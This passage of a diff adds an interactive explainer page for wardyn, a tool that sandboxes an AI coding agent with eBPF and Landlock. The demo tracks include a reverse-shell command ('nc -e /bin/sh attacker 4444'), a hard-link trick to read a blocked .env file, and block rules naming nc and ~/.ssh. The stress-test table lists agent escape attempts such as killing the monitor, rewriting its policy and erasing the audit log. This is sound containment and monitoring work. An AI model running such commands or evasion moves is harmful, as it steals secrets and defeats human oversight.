+          <g id="pulse" class="is-hidden" transform="translate(170,96)">
+            <circle class="halo" r="13"></circle>
+            <circle class="core" r="4.5"></circle>
+          </g>
+          <text class="verdict-stamp" id="stamp" x="372" y="556" text-anchor="middle"></text>
+        </svg>
+        <div class="hint"><i></i><span>click any box for what it is in the kernel, and what wardyn does with it</span></div>
+      </div>
+
+      <div class="readout">
+        <div class="panel">
+          <h3>What just happened</h3>
+          <span class="step-no" id="s-no">READY</span>
+          <p class="step-title" id="s-title">One syscall, six decisions</p>
+          <div class="step-body" id="s-body"></div>
+        </div>
+        <div class="panel">
+          <h3 id="maps-title">Kernel map probes</h3>
+          <div class="maps" id="maps"></div>
+        </div>
+        <div class="panel">
+          <h3>Live feed</h3>
+          <div class="feed" id="feed"><span class="feed-empty">waiting for the first event…</span></div>
+        </div>
+        <div class="counters">
+          <div class="counter"><span class="k">events</span><span class="v" id="c-ev">0</span></div>
+          <div class="counter deny"><span class="k">denied</span><span class="v" id="c-dn">0</span></div>
+          <div class="counter"><span class="k">latency</span><span class="v" id="c-lat">—</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cap"><b>wardyn's side</b> what runs in userspace, as root</div>
+    <div class="strip">
+      <div class="cl"><span class="k ours">policy compiler</span><span class="t">YAML → kernel keys</span><span class="s">Every rule reduced to a name, pair, inode or CIDR key — and every reduction that is broader or impossible is said out loud. <em>§ 3</em></span></div>
+      <div class="cl"><span class="k ours">the feed</span><span class="t">TUI · plain · JSON</span><span class="s">One row per event, allow rows included. <code>--format json</code> carries a versioned schema so a SIEM can hold it to a contract.</span></div>
+      <div class="cl"><span class="k ours">reconcile</span><span class="t">Prediction vs the kernel's word</span><span class="s">Userspace mirrors the matcher to label rows fast; a <code>DENY_*</code> event from the kernel overrides it every time.</span></div>
+      <div class="cl"><span class="k ours">audit log</span><span class="t">The record</span><span class="s">JSONL, root-owned, <code>0600</code>, opened <code>O_NOFOLLOW</code>, real path reported. Append-only across runs. The receipt is the agent's copy; this is the record.</span></div>
+      <div class="cl"><span class="k ours">exceptions</span><span class="t">Approve once, or keep it</span><span class="s"><code>a</code> in the TUI removes one key from the map for this run. Stored approvals persist under a fingerprint of the policy text — they retire when the rules change.</span></div>
+      <div class="cl"><span class="k ours">notices</span><span class="t">Saying what happened</span><span class="s">Fail-open, over-broad keys, an agent-writable policy, a pid namespace — every one announced at startup, never buried. <em>§ 5</em></span></div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════════════════
+       § 2  BEFORE THE FIRST SYSCALL
+       ═══════════════════════════════════════════════════════════════════════ -->
+  <section id="s2">
+    <div class="eyebrow"><span class="n">§ 2</span><span>before the first syscall</span></div>
+    <h2>Hooks first, agent second</h2>
+    <p class="lede">
+      Six things happen before the agent exists — <strong>in this order</strong>, so there is never a moment it runs unwatched.
+    </p>
+
+    <div class="transport">
+      <button class="play" id="play2">▶ Play</button>
+      <button id="step2">Step</button>
+      <button id="reset2">Reset</button>
+      <span class="tick" id="tick2">0 / 6</span>
+    </div>
+
+    <div class="rail" id="rail"></div>
+    <div class="railbar"><i id="railbar"></i></div>
+    <div class="keyline" id="keyline"></div>
+
+    <div class="fails" aria-label="What happens when a step cannot">
+      <div class="failrow"><span class="w"><b>BPF-LSM won't attach</b> — file/exec rows become <b>block~</b>: flagged, not denied</span><span class="r open">fail open · say so</span></div>
+      <div class="failrow"><span class="w"><b>allow_paths:</b> entry can't be resolved — an allowlist with a hole is not weaker, it's gone</span><span class="r refuse">refuse to start</span></div>
+      <div class="failrow"><span class="w"><b>pid namespace</b> unknown inside a container — the wrong tgid would watch a stranger</span><span class="r refuse">refuse to start</span></div>
+      <div class="failrow"><span class="w"><b>--as-user 0</b> — a drop to root is not a drop</span><span class="r refuse">refuse</span></div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════════════════
+       § 3  FROM RULE TO KEY
+       ═══════════════════════════════════════════════════════════════════════ -->
+  <section id="s3">
+    <div class="eyebrow"><span class="n">§ 3</span><span>from rule to kernel key</span></div>
+    <h2>What the kernel is actually given</h2>
+    <p class="lede">
+      A BPF hook cannot run a glob matcher. Every <code>policy.yaml</code> rule is reduced to a fixed-width key the kernel
+      can look up in a hash map or an LPM trie — and the reduction can only ever go one of three ways.
+      Wardyn tells you which, at startup and in <code>--dry-run</code>, because a rule whose key is broader than its
+      text is the failure this project exists to refuse.
+    </p>
+    <div class="compiler">
+      <div class="rules" id="rules"></div>
+      <div class="compiled">
+        <div class="kv">
+          <span class="k">rule</span><span class="v" id="r-rule"></span>
+          <span class="k">kernel key</span><span class="v big" id="r-key"></span>
+          <span class="k">map</span><span class="v" id="r-map"></span>
+          <span class="k">matched by</span><span class="v" id="r-how"></span>
+        </div>
+        <div class="verdict-line" id="r-verdict"></div>
+        <p class="note-p" id="r-note"></p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════════════════
+       § 4  TWO BOUNDARIES
+       ═══════════════════════════════════════════════════════════════════════ -->
+  <section id="s4">
+    <div class="eyebrow"><span class="n">§ 4</span><span>two boundaries, two mechanisms</span></div>
+    <h2>A blocklist and an allowlist are different shapes</h2>
+    <div class="two">
+      <div class="side">
+        <h3><small>eBPF · tracepoints, BPF-LSM, cgroup</small>Name what is forbidden</h3>
+        <pre>files:
+  - { match: "**/.env",        action: block }
+  - { path:  "~/.ssh",         action: block, access: all }
+network:
+  - { cidr: "0.0.0.0/0",      action: block }
+exec:
+  - { match: "**/nc",          action: block }</pre>
+        <ul>
+          <li><b>Anything the policy forgot stays reachable.</b> That is what a blocklist is.</li>
+          <li><b>Can say <code>warn</code></b> — flag without denying — and can be excepted from the TUI, once, for the rest of the run.</li>
+          <li><b>Sees addresses.</b> The only half that can decide egress by CIDR, port <em>and</em> protocol, four LPM tiers deep.</li>
+          <li><b>Needs root</b> to load. The agent has none, so it cannot touch the maps.</li>
+        </ul>
+      </div>
+      <div class="side">
+        <h3><small>Landlock · ABI 1–7</small>Name what is reachable</h3>
+        <pre>allow_paths:
+  - { path: "/usr", rights: [read, exec] }
+  - { path: "/etc", rights: [read] }
+  - { path: ".",    rights: [read, write, exec] }
+allow_ports: [443, 53]</pre>
+        <ul>
+          <li><b>Everything unlisted is unreachable</b> — <code>/home</code>, another checkout, a mounted drive, the agent's own loader if you forget it.</li>
+          <li><b>No privilege needed.</b> Applied in the child before <code>exec</code>, inherited by every descendant, impossible to undo — it holds even for a root agent.</li>
+          <li><b>By port only</b> for TCP. Landlock has no notion of an address, which is exactly why it sits <em>beside</em> the eBPF hooks.</li>
+          <li><b>Reports to nobody.</b> Wardyn's feed reconstructs its denials — and its end-of-run cross-check knows not to count them against the kernel's counters.</li>
+        </ul>
+      </div>
+    </div>
+    <div class="compose">
+      <b>They compose.</b> Containment removes everything outside; the block rules still deny specific objects inside what remains;
+      egress stays decided by eBPF for hosts and by Landlock for ports. An agent confined to the project by
+      <code>allow_paths:</code> still cannot read the project's own <code>.env</code> if a <code>files:</code> rule names it.
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════════════════
+       § 5  SAYING WHAT HAPPENED
+       ═══════════════════════════════════════════════════════════════════════ -->
+  <section id="s5">
+    <div class="eyebrow"><span class="n">§ 5</span><span>saying what happened</span></div>
+    <h2>A tool that reports on a kernel has one job it cannot fail at</h2>
+    <p class="lede">
+      Most of wardyn's fixed bugs were the same bug: the tool saying something about itself that was not true.
+      The feed vocabulary, the startup notices and the end-of-run cross-check exist so that the honest answer
+      is always the one on screen.
+    </p>
+    <div class="vocab">
+      <div class="v-row"><span class="act ok">ok</span><span class="m">Observed, permitted. <b>Streamed too</b> — a log that only records violations cannot show what an agent actually did.</span></div>
+      <div class="v-row"><span class="act warn">⚠ warn</span><span class="m">Flagged by policy, <b>not denied</b>. Either the rule said <code>warn</code>, or it is a <code>block</code> that observe mode never enforces.</span></div>
+      <div class="v-row"><span class="act block">⛔BLOCK</span><span class="m">Denied, and the kernel <b>confirmed it</b> with its own <code>DENY_*</code> event. A prediction never outranks the kernel's word.</span></div>
+      <div class="v-row"><span class="act soft">block~</span><span class="m">The policy says block, but <b>the kernel cannot enforce it</b> — the LSM did not attach, the offsets were untrusted, or the glob does not reduce to a key. Flagged, and honest about why.</span></div>
+    </div>
+    <div class="notices">
+      <div class="notice"><span class="w">startup</span><span><em>policy `/etc/shadow` (block) enforces on any file named `shadow` directly under a dir named `etc`</em> — the kernel matches by name, so it will also deny paths the glob wouldn't. Write `{ path: "/etc/shadow", action: block }` to pin exactly that file.</span></div>
+      <div class="notice"><span class="w">startup</span><span><em>the policy file policy.yaml is writable by the agent (uid 1000)</em> — it could rewrite the rules that constrain it before the next run.</span></div>
+      <div class="notice"><span class="w">startup</span><span><em>pid namespace detected (self 461, kernel view 22794)</em> — relying on in-kernel fork adoption; the feed shows init-ns pids</span></div>
+      <div class="notice"><span class="w">exit</span><span>kernel denials — 15 file, 0 exec, 5 network · <em>15 of those matched by identity (dev,ino)</em> — a rename or hard link would have defeated a name rule.</span></div>
+      <div class="notice bad"><span class="w">exit</span><span><em>WARNING: 17227 event(s) were dropped by a full ring buffer</em> — those actions have no feed row, no audit record and no receipt line.</span></div>
+      <div class="notice bad"><span class="w">exit</span><span><em>WARNING: 26 denial(s) were reported to the agent but the kernel counted none</em> — enforcement did NOT fire. Treat this run as observe-only. <span style="color:var(--ink-faint)">(the cross-check that cannot be fooled by a wrong struct offset)</span></span></div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════════════════
+       § 6  MEASURED
+       ═══════════════════════════════════════════════════════════════════════ -->
+  <section id="s6">
+    <div class="eyebrow"><span class="n">§ 6</span><span>measured, not claimed</span></div>
+    <h2>Four scenarios that try to break it</h2>
+    <p class="lede">
+      Same sixteen-line policy for all four, so nothing is stopped by a rule you cannot see. Each is recorded
+      separately in <code>docs/stress/</code>; the first carries its own control.
+    </p>
+    <div class="tablewrap">
+    <table class="res">
+      <tr><th>scenario</th><th>what it tries</th><th>result</th></tr>
+      <tr><td>1 · escape</td><td>rename the secret, hard-link it out, move its directory, symlink to it, walk to it through <code>../</code></td><td class="r g">8 attacks, 8 stopped</td></tr>
+      <tr><td>1 · control</td><td>the same attacks against <em>name</em> rules instead of <code>(dev, ino)</code></td><td class="r a">the hard link gets through</td></tr>
+      <tr><td>2 · self-defence</td><td>reach the BPF maps, read <code>/proc/kcore</code>, kill wardyn, setuid escalation, a user namespace, rewrite the policy, erase the audit log</td><td class="r g">15 attempts, 14 refused</td></tr>
+      <tr><td>3 · load</td><td>450 processes, then 40,000 opens from 8 processes at once</td><td class="r g">secret still denied · ~13,000 events dropped and reported</td></tr>
+      <tr><td>4 · real work</td><td>git, gcc, make, python3, 300 files created and deleted, under the same enforcing policy</td><td class="r g">15 operations, none broken</td></tr>
+    </table>
+    </div>
+    <div class="proof-grid">
+      <div class="fact"><span class="num">~15 µs</span><span class="lab">added per open, measured as a slope (N vs 2N) so startup cancels out</span></div>
+      <div class="fact"><span class="num">21</span><span class="lab">eBPF programs clearing the verifier on every PR</span></div>
+      <div class="fact"><span class="num">81</span><span class="lab">end-to-end assertions against a real BPF-LSM kernel</span></div>
+      <div class="fact"><span class="num">98 / 113</span><span class="lab">audit findings closed, each checked against the code; unverifiable ones count as open</span></div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════════════════
+       § 7  WHAT IT DOES NOT DO
+       ═══════════════════════════════════════════════════════════════════════ -->
+  <section id="s7">
+    <div class="eyebrow"><span class="n">§ 7</span><span>what it does not do</span></div>
+    <h2>Stated, so nobody discovers it the hard way</h2>
+    <div class="limits">
+      <div class="limit"><b>io_uring</b> Submissions bypass the syscall tracepoints, so they are missing from the feed. The LSM hooks still fire on the actual open.</div>
+      <div class="limit"><b>AF_UNIX &amp; loopback delegation</b> An agent that asks a local daemon to do its reading is not watched through the daemon.</div>
+      <div class="limit"><b>Raw sockets</b> <code>SOCK_RAW</code> / <code>AF_PACKET</code> skip the cgroup hooks — and need <code>CAP_NET_RAW</code>, which the dropped agent does not have.</div>
+      <div class="limit"><b>The policy file's location</b> <code>./policy.yaml</code> is the default, and that directory is the agent's. Wardyn warns; it does not refuse.</div>
+      <div class="limit"><b>Name rules and <code>mv</code></b> A <code>match:</code> glob is a name. Renaming defeats it — which is what <code>path:</code> identity rules are for.</div>
+      <div class="limit"><b>One maintainer</b> There is no second person with merge rights. GOVERNANCE.md says so before you depend on it.</div>
+    </div>
+  </section>
+
+  <section class="notes" aria-label="Three things the whole design turns on">
+    <div class="note"><h3>The observer cannot deny</h3><p>The tracepoint sees the call and reports it. The verdict is the LSM hook's, further down. <code>The hook that decides is the hook that reports</code>, so the feed can never claim a denial the kernel never made.</p></div>
+    <div class="note"><h3>Names lose, inodes don't</h3><p>A <code>path:</code> rule keys on <code>(dev, ino)</code> — the object itself. Rename it, hard-link it, move the directory: the inode is unchanged, and so is the verdict.</p></div>
+    <div class="note"><h3>Losing the log is not losing the boundary</h3><p>The verdict is decided inside the syscall. The report goes through a ring that can fill — and when it does, wardyn says so in numbers. A silent drop would be the real failure.</p></div>
+  </section>
+
+  <footer>
+    <span>wardyn · eBPF + Landlock · v0.4.0 · AGPL-3.0</span>
+    <span><a href="https://github.com/kadircanyildirm-crypto/wardyn">github.com/kadircanyildirm-crypto/wardyn</a></span>
+  </footer>
+</div>
+
+<script>
+(function () {
+  "use strict";
+  var $ = function (id) { return document.getElementById(id); };
+
+  /* ═══════════════════════ § 1 · the syscall ═══════════════════════════ */
+
+  // Waypoints on the bus. The pulse only ever moves BETWEEN these, along the
+  // wire that joins them — never across the gap — so every step reads as a
+  // signal travelling a circuit rather than a marker jumping between boxes.
+  var W = {
+    A: [170, 96], C: [326, 96], S0: [372, 96], X: [372, 168],
+    S1: [372, 232], T: [520, 232], S2: [372, 316], Wd: [520, 316],
+    S3: [372, 400], H: [520, 400], V: [372, 500], S4: [372, 462],
+    R: [180, 462], Rin: [196, 462], U: [196, 110], Ain: [170, 110],
+    RB: [108, 484], RC: [108, 500]
+  };
+  function poly(pts) { return pts.map(function (p, k) { return (k ? "L" : "M") + p[0] + " " + p[1]; }).join(" "); }
+
+  var DEFAULT_NODES = {
+    "agent-name": "claude", "agent-l1": "uid 1000", "agent-l2": "no_new_privs",
+    "trace-note": "observes · cannot deny",
+    "watched-name": "WATCHED[tgid]", "watched-note": "is this the agent's subtree?",
+    "ring-name": "EVENTS ring", "ring-note": "→ feed · audit log",
+    "rcpt-name": "WARDYN_DENIALS", "rcpt-note": "the receipt → the agent"
+  };
+
+  var TRACKS = {
+    deny: {
+      call: "openat()", arg: "~/.ssh/id_ed25519",
+      trace: "tracepoint/sys_enter_openat", hook: "lsm/file_open", hookNote: "this one can say no",
+      probes: [
+        { k: "BLOCK_INODES  (dev 8:48, ino 394815)", v: "HIT", hit: true },
+        { k: "BLOCK_PAIRS   (.ssh, id_ed25519)", v: "not reached", skip: true },
+        { k: "BLOCK_NAMES   (id_ed25519)", v: "not reached", skip: true },
+        { k: "BLOCK_DIRS    ancestor walk", v: "not reached", skip: true }
+      ],
+      verdictA: "-EPERM", verdictB: "denied", stamp: "-EPERM  ·  returned inside the syscall",
+      kind: "deny", latency: "4.1 µs",
+      feed: { act: "⛔BLOCK", detail: "/home/me/.ssh/id_ed25519", rule: "path:~/.ssh/id_ed25519", cls: "block" },
+      steps: [
+        ["the agent asks", "The process wardyn launched issues <code>openat(\"~/.ssh/id_ed25519\")</code>. It runs as uid 1000 with <code>NO_NEW_PRIVS</code> — wardyn dropped it before <code>exec</code>, so it cannot get the privilege back."],
+        ["across the boundary", "The call leaves userspace. From here the agent has no say in what happens: it cannot see wardyn, unload it, or race it."],
+        ["the tracepoint sees it", "<code>sys_enter_openat</code> fires first. It <em>observes</em> — copies the path and pushes an event toward userspace. It cannot deny anything, and wardyn never lets it pretend otherwise."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code> is checked. The map was seeded with the agent's kernel-view tgid before <code>spawn</code>, and the fork hook adopts every descendant. An unwatched process is ignored entirely."],
+        ["the hook that can refuse", "<code>lsm/file_open</code>. A real LSM hook, called by the kernel as part of deciding the open — not a wrapper around it. Whatever it returns <em>is</em> the answer."],
+        ["identity, before name", "The inode is checked first. <code>(dev 8:48, ino 394815)</code> is in <code>BLOCK_INODES</code> — the file the operator pinned, whatever it is called today. No further probe is needed."],
+        ["-EPERM, in the syscall", "The hook returns <code>-EPERM</code>. Not a signal, not a kill: the <code>open</code> itself fails, synchronously, before the descriptor exists. There is nothing to race."],
+        ["reported, then explained", "The denial goes to the ring buffer — feed, audit log, and the agent's own receipt. The agent gets a bare <code>EPERM</code>; <code>WARDYN_DENIALS</code> tells it which rule fired, so it reports instead of retrying."]
+      ]
+    },
+    allow: {
+      call: "openat()", arg: "src/auth.rs",
+      trace: "tracepoint/sys_enter_openat", hook: "lsm/file_open", hookNote: "asks, then steps aside",
+      probes: [
+        { k: "BLOCK_INODES  (dev 8:48, ino 401122)", v: "miss" },
+        { k: "BLOCK_PAIRS   (src, auth.rs)", v: "miss" },
+        { k: "BLOCK_NAMES   (auth.rs)", v: "miss" },
+        { k: "BLOCK_DIRS    ancestor walk ×3", v: "miss" }
+      ],
+      verdictA: "0", verdictB: "allowed", stamp: "0  ·  the kernel carries on",
+      kind: "allow", latency: "3.8 µs",
+      feed: { act: "ok", detail: "/home/me/project/src/auth.rs", rule: "", cls: "ok" },
+      steps: [
+        ["ordinary work", "The same agent opens a source file. Nothing about this path is special, which is exactly the case that has to stay fast."],
+        ["across the boundary", "Identical journey. Wardyn does not branch on whether it expects to allow — every open takes the same road."],
+        ["the tracepoint sees it", "The event is emitted whether or not anything will be denied. An audit log that only records violations cannot show what an agent actually did."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code> hits. Yes — this is the subtree wardyn launched."],
+        ["the hook that can refuse", "<code>lsm/file_open</code> runs the same matcher, in the same order. The cost of being watched is paid here: about four microseconds."],
+        ["four probes, four misses", "Inode, then <code>(parent, name)</code>, then the bare name, then up the ancestor chain to <code>MAX_DIR_WALK</code>. Nothing matches. The absence of a rule is the answer."],
+        ["0 — carry on", "The hook returns <code>0</code>. The kernel completes the open exactly as it would have without wardyn attached."],
+        ["logged anyway", "The allow row is written too. <code>--format json</code> ships every event, so a log shipper gets the baseline and does its own filtering."]
+      ]
+    },
+    hardlink: {
+      call: "openat()", arg: "project/copy.env",
+      agent: { name: "claude", l1: "ln vault/.env project/copy.env", l2: "then reads the copy" },
+      trace: "tracepoint/sys_enter_openat", hook: "lsm/file_open", hookNote: "same inode, different name",
+      probes: [
+        { k: "BLOCK_INODES  (dev 8:48, ino 394815)", v: "HIT", hit: true },
+        { k: "BLOCK_PAIRS   (project, copy.env)", v: "not reached", skip: true },
+        { k: "BLOCK_NAMES   (copy.env)", v: "not reached", skip: true },
+        { k: "BLOCK_DIRS    ancestor walk", v: "not reached", skip: true }
+      ],
+      verdictA: "-EPERM", verdictB: "denied", stamp: "-EPERM  ·  the name changed, the inode did not",
+      kind: "deny", latency: "4.1 µs",
+      feed: { act: "⛔BLOCK", detail: "copy.env (same object as ~/vault/.env)", rule: "path:~/vault/.env", cls: "block" },
+      steps: [
+        ["the classic bypass", "The agent hard-links the secret to an innocent name: <code>ln vault/.env project/copy.env</code>. One inode, two names. Then it opens the copy. A rule that matched <code>.env</code> by name would let this straight through — the stress suite's control run shows exactly that."],
+        ["across the boundary", "<code>openat(\"project/copy.env\")</code>. The path looks like nothing at all."],
+        ["the tracepoint sees it", "Observed as <code>project/copy.env</code>. The userspace mirror, matching by name, would predict <em>allow</em> here — which is why it is only a prediction."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code> hits."],
+        ["the hook that can refuse", "<code>lsm/file_open</code> has the <code>struct file</code>, and through it the dentry and the inode. It does not care what the path was."],
+        ["the inode is the same", "<code>(dev 8:48, ino 394815)</code> — the very key the <code>path:</code> rule resolved to at startup. <code>BLOCK_INODES</code> hits. Names lose; inodes don't."],
+        ["-EPERM", "Denied. The feed row says <code>same object as ~/vault/.env</code>, and the exit summary counts it under <em>matched by identity — a rename or hard link would have defeated a name rule</em>."],
+        ["reported", "The kernel's <code>DENY_FILE</code> event carries <code>matched_key: ino=394815</code>, so the reconcile layer overrides the mirror's wrong guess. The kernel's word wins."]
+      ]
+    },
+    "delete": {
+      call: "unlinkat()", arg: "~/.ssh/id_ed25519",
+      trace: "(no observe tracepoint)", traceNote: "the kernel reports this one itself",
+      hook: "lsm/inode_unlink", hookNote: "the lifecycle axis: access: delete",
+      probes: [
+        { k: "BLOCK_INODES  (dev 8:48, ino 394815) · delete", v: "HIT", hit: true },
+        { k: "BLOCK_DIR_INODES  parent walk", v: "not reached", skip: true },
+        { k: "BLOCK_NAMES   (id_ed25519) · delete", v: "not reached", skip: true }
+      ],
+      verdictA: "-EPERM", verdictB: "denied", stamp: "-EPERM  ·  the file is still there",
+      kind: "deny", latency: "3.6 µs",
+      feed: { act: "⛔BLOCK", detail: "unlink ~/.ssh/id_ed25519", rule: "path:~/.ssh access:all", cls: "block" },
+      steps: [
+        ["rm is not a read", "<code>rm ~/.ssh/id_ed25519</code>. A <code>block</code> on reading the key says nothing about deleting it — so the policy has an <code>access:</code> axis: <code>read</code>, <code>write</code>, <code>create</code>, <code>delete</code>, <code>all</code>."],
+        ["across the boundary", "<code>unlinkat()</code>. There is no observe tracepoint on this path, on purpose — see step 3."],
+        ["no observer here", "The lifecycle hooks report their own denials. Attaching a tracepoint too would mean two sources for one event, and the reconcile layer already treats the kernel's <code>DENY_*</code> as the only authority."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code> hits."],
+        ["inode_unlink", "One of five lifecycle hooks: <code>inode_unlink</code>, <code>inode_rmdir</code>, <code>inode_rename</code>, <code>inode_create</code>, <code>inode_mkdir</code>. Attached only when the policy asks for the axis — a policy without <code>access:</code> pays nothing for it."],
+        ["the mask carries the axis", "The map value is a bitmask, not a flag. <code>access: all</code> set the delete bit on this inode's entry; a rule with <code>access: read</code> would not match here, and the <code>rm</code> would go through."],
+        ["-EPERM", "The unlink fails. The file is still there. <code>mv</code> out of the directory fails the same way, through <code>inode_rename</code> — and so does <code>ln</code>, through <code>inode_link</code>."],
+        ["counted apart", "The exit summary keeps a separate line: <em>kernel denials — 5 delete, 5 create (lifecycle hooks)</em>. A read denial and a delete denial are different promises, and they are counted as such."]
+      ]
+    },
+    exec: {
+      call: "execve()", arg: "/usr/bin/nc -e /bin/sh …",
+      trace: "tracepoint/sys_enter_execve", hook: "lsm/bprm_check_security", hookNote: "before the new image loads",
+      probes: [
+        { k: "BLOCK_EXEC_INODES  (identity)", v: "miss" },
+        { k: "BLOCK_EXEC    (name = nc)", v: "HIT", hit: true }
+      ],
+      verdictA: "-EPERM", verdictB: "denied", stamp: "-EPERM  ·  the process image never loads",
+      kind: "deny", latency: "5.2 µs",
+      feed: { act: "⛔BLOCK", detail: "/usr/bin/nc", rule: "**/nc", cls: "block" },
+      steps: [
+        ["a reverse shell", "The agent tries <code>nc -e /bin/sh attacker 4444</code>. Egress rules would catch the connect; the exec rule catches it earlier, before <code>nc</code> is even a process."],
+        ["across the boundary", "<code>execve()</code>. The kernel is about to replace this process's image."],
+        ["the tracepoint sees it", "<code>sys_enter_execve</code> — and <code>execveat</code>, which is hooked too so a denial cannot happen off-feed."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code> hits. Note the tgid does not change across <code>exec</code>, so the watch survives it."],
+        ["bprm_check_security", "The LSM hook the kernel calls with the new program's <code>linux_binprm</code> in hand, before any of it is mapped. Wardyn reads the file's dentry from <code>bprm->file</code>, by an offset resolved from BTF at startup."],
+        ["name, after identity", "An identity key would win first (an exec pinned by <code>path:</code>). None here — so the basename <code>nc</code> is looked up in <code>BLOCK_EXEC</code>. Hit."],
+        ["-EPERM", "<code>execve</code> fails. The shell gets <em>Permission denied</em>, and its <code>$?</code> is 126. No process, no socket, nothing to clean up."],
+        ["the exec is in the feed", "As <code>exec ⛔BLOCK /usr/bin/nc [**/nc]</code>. The receipt tells the agent the rule; a human can decide whether <code>nc</code> was ever legitimate."]
+      ]
+    },
+    net: {
+      call: "connect()", arg: "185.220.101.7:443",
+      trace: "tracepoint/sys_enter_connect", hook: "cgroup/connect4", hookNote: "runs before the packet exists",
+      probes: [
+        { k: "NET_RULES  proto+port  tcp/443", v: "miss" },
+        { k: "NET_RULES  port        443", v: "miss" },
+        { k: "NET_RULES  proto       tcp", v: "miss" },
+        { k: "NET_RULES  LPM  0.0.0.0/0", v: "HIT", hit: true }
+      ],
+      verdictA: "-EPERM", verdictB: "denied", stamp: "-EPERM  ·  no packet was ever sent",
+      kind: "deny", latency: "2.9 µs",
+      feed: { act: "⛔BLOCK", detail: "185.220.101.7:443", rule: "cidr:0.0.0.0/0", cls: "block" },
+      steps: [
+        ["the agent dials out", "<code>connect(185.220.101.7:443)</code>. A plausible-looking HTTPS call to an address nothing in the policy allows."],
+        ["across the boundary", "Same boundary, different hook. Egress is the one axis Landlock cannot decide by address, so this half is eBPF's alone."],
+        ["the tracepoint sees it", "<code>sys_enter_connect</code> records the attempt. <code>sendto</code> and <code>sendmsg</code> are hooked too."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code>. The same map gates every axis, so scope is decided in one place."],
+        ["cgroup/connect4", "Attached to the root cgroup, this program runs <em>inside</em> <code>connect()</code>, before a single packet is built. An IPv6 <code>::ffff:a.b.c.d</code> destination is unwrapped and sent down this same v4 path — the mapped-address bypass is closed."],
+        ["four tiers, most specific first", "protocol+port, then port, then protocol, then the address trie. The first three miss; <code>0.0.0.0/0 block</code> catches it. Order is what lets one <code>allow</code> rule sit inside a deny-all."],
+        ["-EPERM, no packet", "The connect fails. Nothing left the machine — this is not a firewall dropping a packet after the fact."],
+        ["reported, then explained", "The row reaches the feed and the receipt. The agent is told which rule refused it, so a human can widen the policy if it was wrong."]
+      ]
+    },
+    dns: {
+      call: "sendmsg()", arg: "UDP → 127.0.0.53:53",
+      trace: "tracepoint/sys_enter_sendto", hook: "cgroup/sendmsg4", hookNote: "UDP has no connect — this is the hook",
+      probes: [
+        { k: "NET_RULES  proto+port  udp/53", v: "allow", pass: true },
+        { k: "NET_RULES  port        53", v: "not reached", skip: true },
+        { k: "NET_RULES  proto       udp", v: "not reached", skip: true },
+        { k: "NET_RULES  LPM  0.0.0.0/0 block", v: "not reached", skip: true }
+      ],
+      verdictA: "0", verdictB: "allowed", stamp: "0  ·  the resolver has to work",
+      kind: "allow", latency: "3.1 µs",
+      feed: { act: "ok", detail: "udp 127.0.0.53:53", rule: "port:53 proto:udp allow", cls: "ok" },
+      steps: [
+        ["a DNS lookup", "Before any HTTPS call there is a UDP datagram to the resolver. A deny-all egress policy that forgets this breaks every hostname — so <code>policies/contained.yaml</code> carries <code>{ port: 53, proto: udp, action: allow }</code>."],
+        ["across the boundary", "<code>sendmsg()</code>, not <code>connect()</code>: UDP sockets usually do not connect. That is why wardyn hooks <code>sendmsg4</code> and <code>sendmsg6</code> as well — otherwise UDP would be the hole."],
+        ["the tracepoint sees it", "<code>sys_enter_sendto</code> observes the datagram. Without it, an allowed UDP send would be enforced correctly but never appear in the feed."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code> hits."],
+        ["cgroup/sendmsg4", "Runs per datagram, with the destination in hand. Same four-tier lookup as connect."],
+        ["the most specific tier answers", "<code>(udp, 53)</code> is found in the protocol+port tier and says <em>allow</em>. The deny-all below it is never consulted — which is the entire point of ordering the tiers most-specific-first."],
+        ["0", "The datagram goes out. The same host over <em>TCP</em> port 53 would fall through to the block, because the rule named the protocol."],
+        ["in the feed as ok", "With the rule that permitted it. A <code>domain:</code> rule would also have worked here, but it resolves names every 60 s and says so — <code>cidr:</code> and <code>port:</code> are the ones to use where it has to be sound."]
+      ]
+    },
+    port: {
+      call: "connect()", arg: "10.0.0.7:8080",
+      agent: { name: "claude", l1: "uid 1000 · no_new_privs", l2: "landlock: allow_ports [443, 53]" },
+      trace: "tracepoint/sys_enter_connect", hook: "landlock · socket_connect", hookNote: "a different LSM, by port only", alt: true,
+      probes: [
+        { k: "allow_ports  443", v: "no" },
+        { k: "allow_ports  53", v: "no" },
+        { k: "8080 is not listed", v: "REFUSED", hit: true }
+      ],
+      mapsTitle: "Landlock ruleset",
+      verdictA: "-EACCES", verdictB: "refused", stamp: "-EACCES  ·  Landlock, before wardyn's hook is asked",
+      kind: "deny", latency: "1.8 µs",
+      feed: { act: "⛔BLOCK", detail: "10.0.0.7:8080", rule: "allow_ports: 8080 not listed", cls: "block" },
+      steps: [
+        ["TCP containment", "The policy says <code>allow_ports: [443, 53]</code>. Not a blocklist of ports — an allowlist. The agent may connect to, or bind, those TCP ports and no others."],
+        ["across the boundary", "<code>connect(10.0.0.7:8080)</code>. The address is on an allowed CIDR; the port is not on the list."],
+        ["the tracepoint sees it", "Observed as usual. But the tracepoint cannot see what Landlock is about to do."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code> hits — but this decision will not need it."],
+        ["a different LSM", "Landlock's <code>socket_connect</code> hook runs with the ruleset wardyn applied in the child before <code>exec</code>: <code>landlock_restrict_self()</code>, inherited by every descendant, irreversible. It needs no privilege and no eBPF."],
+        ["by port only", "Landlock has no notion of an address. 8080 is not in the ruleset. That is why <code>allow_ports:</code> sits <em>beside</em> the cgroup hooks — eBPF still decides which <em>hosts</em>, inside the ports that remain."],
+        ["-EACCES", "Refused before wardyn's own <code>connect4</code> program would have been asked. Both directions are confined: a <code>bind()</code> on 8080 fails the same way, so the agent cannot listen and be connected to instead."],
